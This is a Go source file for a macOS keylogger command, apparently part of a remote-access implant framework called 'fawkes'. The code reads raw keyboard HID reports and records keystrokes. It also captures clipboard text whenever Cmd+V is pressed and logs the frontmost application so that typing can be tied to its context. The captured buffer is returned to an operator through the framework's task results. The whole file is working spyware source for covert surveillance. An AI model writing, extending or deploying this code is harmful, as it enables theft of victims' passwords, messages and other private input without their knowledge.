//go:build darwin

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

// macOS keylogging via IOKit HID device reading. Requires root or
// membership in the input/admin group with Accessibility permissions.
// Uses /dev/hidN devices for raw keyboard event capture.
// Falls back to osascript-based frontmost app tracking for window context.

type keylogState struct {
	mu          sync.Mutex
	running     bool
	stopCh      chan struct{}
	buffer      strings.Builder
	startTime   time.Time
	keyCount    int
	lastWindow  string
	shiftDown   bool
	ctrlDown    bool
	cmdDown     bool
}

var kl = &keylogState{}

type KeylogCommand struct{}

func (c *KeylogCommand) Name() string        { return "keylog" }
func (c *KeylogCommand) Description() string { return "Start/stop/dump a keyboard logger (macOS)" }

type keylogArgs struct {
	Action string `json:"action"`
}

func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[keylogArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "start":
		return keylogStart()
	case "stop":
		return keylogStop()
	case "dump":
		return keylogDump()
	case "status":
		return keylogStatus()
	case "clear":
		return keylogClear()
	default:
		return errorf("Unknown action: %s. Use: start, stop, dump, status, clear", args.Action)
	}
}

func keylogStart() structs.CommandResult {
	kl.mu.Lock()
	if kl.running {
		kl.mu.Unlock()
		return errorResult("Keylogger is already running")
	}
	kl.running = true
	kl.buffer.Reset()
	kl.startTime = time.Now()
	kl.keyCount = 0
	kl.shiftDown = false
	kl.ctrlDown = false
	kl.cmdDown = false
	kl.lastWindow = ""
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()

	devices, err := findHIDKeyboards()
	if err != nil || len(devices) == 0 {
		kl.mu.Lock()
		kl.running = false
		kl.mu.Unlock()
		if err != nil {
			return errorf("Error finding keyboard devices: %v", err)
		}
		return errorResult("No keyboard HID devices found. Requires root or Accessibility permissions.")
	}

	for _, dev := range devices {
		go readHIDDevice(dev, kl.stopCh)
	}
	go trackFrontmostApp(kl.stopCh)

	return successf("Keylogger started on %d device(s) with app tracking. Use 'keylog -action dump' to view, 'keylog -action stop' to stop.", len(devices))
}

func keylogStop() structs.CommandResult {
	kl.mu.Lock()
	if !kl.running {
		kl.mu.Unlock()
		return errorResult("Keylogger is not running")
	}

	close(kl.stopCh)

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)
	keyCount := kl.keyCount
	kl.running = false
	kl.buffer.Reset()
	kl.mu.Unlock()

	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), keyCount, output)
	return successResult(result)
}

func keylogDump() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return errorResult("Keylogger is not running")
	}

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)

	if output == "" {
		return successf("Keylogger running for %s — no keystrokes captured yet", duration.Round(time.Second))
	}

	return successf("Keylogger running for %s — %d keystrokes captured\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), kl.keyCount, output)
}

func keylogStatus() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return successResult("Keylogger is not running.")
	}

	duration := time.Since(kl.startTime)
	bufSize := kl.buffer.Len()
	return successf("Keylogger status:\n  State:      running\n  Duration:   %s\n  Keystrokes: %d\n  Buffer:     %s",
		duration.Round(time.Second), kl.keyCount, formatFileSize(int64(bufSize)))
}

func keylogClear() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return errorResult("Keylogger is not running")
	}

	cleared := kl.keyCount
	kl.buffer.Reset()
	kl.keyCount = 0
	return successf("Buffer cleared (%d keystrokes removed). Keylogger continues running.", cleared)
}

// findHIDKeyboards discovers keyboard HID devices on macOS.
// Modern macOS exposes /dev/hidN devices for HID input.
func findHIDKeyboards() ([]string, error) {
	matches, err := filepath.Glob("/dev/hid*")
	if err != nil {
		return nil, err
	}

	var devices []string
	for _, path := range matches {
		f, err := os.Open(path)
		if err != nil {
			continue
		}
		f.Close()
		devices = append(devices, path)
	}

	if len(devices) == 0 {
		return findIOKitKeyboards()
	}
	return devices, nil
}

// findIOKitKeyboards uses ioreg to discover keyboard devices.
func findIOKitKeyboards() ([]string, error) {
	out, err := execCmdTimeoutOutput("ioreg", "-r", "-c", "IOHIDKeyboard", "-l")
	if err != nil {
		return nil, fmt.Errorf("ioreg failed: %w", err)
	}

	if strings.Contains(string(out), "IOHIDKeyboard") {
		return []string{"/dev/console"}, nil
	}
	return nil, nil
}

// readHIDDevice reads raw HID reports from a macOS device.
func readHIDDevice(path string, stopCh <-chan struct{}) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	buf := make([]byte, 64)
	for {
		select {
		case <-stopCh:
			return
		default:
		}

		_ = f.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := f.Read(buf)
		if err != nil {
			if os.IsTimeout(err) {
				continue
			}
			return
		}
		if n < 8 {
			continue
		}

		processHIDReport(buf[:n])
	}
}

// processHIDReport interprets a raw HID keyboard report.
// Standard boot protocol: byte[0]=modifiers, byte[1]=reserved, byte[2..7]=keycodes
func processHIDReport(report []byte) {
	if len(report) < 8 {
		return
	}

	modifiers := report[0]

	kl.mu.Lock()
	kl.shiftDown = modifiers&0x22 != 0 // Left/Right Shift
	kl.ctrlDown = modifiers&0x11 != 0  // Left/Right Ctrl
	kl.cmdDown = modifiers&0x88 != 0   // Left/Right GUI (Cmd)

	for i := 2; i < len(report) && i < 8; i++ {
		keycode := report[i]
		if keycode == 0 || keycode == 1 {
			continue
		}

		// Detect Cmd+V paste
		if kl.cmdDown && keycode == 0x19 { // 0x19 = HID usage for 'v'
			kl.mu.Unlock()
			if clip := clipReadText(); clip != "" {
				kl.mu.Lock()
				kl.buffer.WriteString(fmt.Sprintf("[PASTE:%s]", truncateString(clip, 200)))
				kl.keyCount++
				kl.mu.Unlock()
			}
			kl.mu.Lock()
			continue
		}

		keyName := hidUsageToString(keycode, kl.shiftDown)
		if keyName != "" {
			kl.buffer.WriteString(keyName)
			kl.keyCount++
		}
	}
	kl.mu.Unlock()
}

// trackFrontmostApp periodically polls the frontmost application name.
func trackFrontmostApp(stopCh <-chan struct{}) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopCh:
			return
		case <-ticker.C:
			app := getFrontmostApp()
			if app == "" {
				continue
			}
			kl.mu.Lock()
			if app != kl.lastWindow {
				kl.buffer.WriteString(fmt.Sprintf("\n[%s] --- %s ---\n",
					time.Now().Format("15:04:05"), app))
				kl.lastWindow = app
			}
			kl.mu.Unlock()
		}
	}
}

// getFrontmostApp returns the name of the frontmost application using osascript.
func getFrontmostApp() string {
	out, err := execCmdTimeoutOutput("osascript", "-e",
		`tell application "System Events" to get name of first process whose frontmost is true`)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

// hidUsageToString maps USB HID keyboard usage IDs to characters.
func hidUsageToString(usage byte, shift bool) string {
	switch {
	case usage >= 0x04 && usage <= 0x1D: // a-z
		c := rune('a' + (usage - 0x04))
		if shift {
			c -= 32 // uppercase
		}
		return string(c)
	case usage >= 0x1E && usage <= 0x26: // 1-9
		if shift {
			shiftNum := []string{"!", "@", "#", "$", "%", "^", "&", "*", "("}
			return shiftNum[usage-0x1E]
		}
		return string(rune('1' + (usage - 0x1E)))
	case usage == 0x27: // 0
		if shift {
			return ")"
		}
		return "0"
	case usage == 0x28: // Enter
		return "[ENTER]\n"
	case usage == 0x29: // Escape
		return "[ESC]"
	case usage == 0x2A: // Backspace
		return "[BS]"
	case usage == 0x2B: // Tab
		return "[TAB]"
	case usage == 0x2C: // Space
		return " "
	case usage == 0x2D: // - _
		if shift {
			return "_"
		}
		return "-"
	case usage == 0x2E: // = +
		if shift {
			return "+"
		}
		return "="
	case usage == 0x2F: // [ {
		if shift {
			return "{"
		}
		return "["
	case usage == 0x30: // ] }
		if shift {
			return "}"
		}
		return "]"
	case usage == 0x31: // \ |
		if shift {
			return "|"
		}
		return "\\"
	case usage == 0x33: // ; :
		if shift {
			return ":"
		}
		return ";"
	case usage == 0x34: // ' "
		if shift {
			return "\""
		}
		return "'"
	case usage == 0x35: // ` ~
		if shift {
			return "~"
		}
		return "`"
	case usage == 0x36: // , <
		if shift {
			return "<"
		}
		return ","
	case usage == 0x37: // . >
		if shift {
			return ">"
		}
		return "."
	case usage == 0x38: // / ?
		if shift {
			return "?"
		}
		return "/"
	case usage == 0x39: // Caps Lock
		return "[CAPS]"
	case usage >= 0x3A && usage <= 0x45: // F1-F12
		return fmt.Sprintf("[F%d]", usage-0x39)
	case usage == 0x4C: // Delete Forward
		return "[DEL]"
	case usage == 0x4F: // Right Arrow
		return "[RIGHT]"
	case usage == 0x50: // Left Arrow
		return "[LEFT]"
	case usage == 0x51: // Down Arrow
		return "[DOWN]"
	case usage == 0x52: // Up Arrow
		return "[UP]"
	}
	return ""
}

